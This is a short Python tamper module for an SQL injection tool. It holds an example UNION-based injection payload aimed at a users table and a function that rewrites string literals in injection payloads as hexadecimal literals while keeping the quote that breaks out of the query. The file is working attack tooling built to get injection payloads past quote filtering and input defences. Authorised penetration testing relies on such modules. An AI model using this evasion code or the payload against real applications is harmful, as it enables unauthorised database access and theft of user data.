import re

__example_payload__ = "' UNION SELECT 'admin' FROM users--"
__type__ = "encode SQL string literals as 0x hexadecimal literals"
__category__ = "sqli"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

_STRING_LITERAL = re.compile(r"'((?:[^']|'')*)'")


def _to_hex(match):
    content = match.group(1).replace("''", "'")
    if not content:
        return match.group(0)
    return "0x{}".format(content.encode("utf-8").hex())


def tamper(payload, **kwargs):
    if not payload:
        return payload
    # A leading quote is usually the injection delimiter (closes the app's own
    # string), not a literal to encode. Keep it intact and encode the rest.
    head, rest = "", payload
    if rest[0] == "'":
        head, rest = "'", rest[1:]
    return head + _STRING_LITERAL.sub(_to_hex, rest)
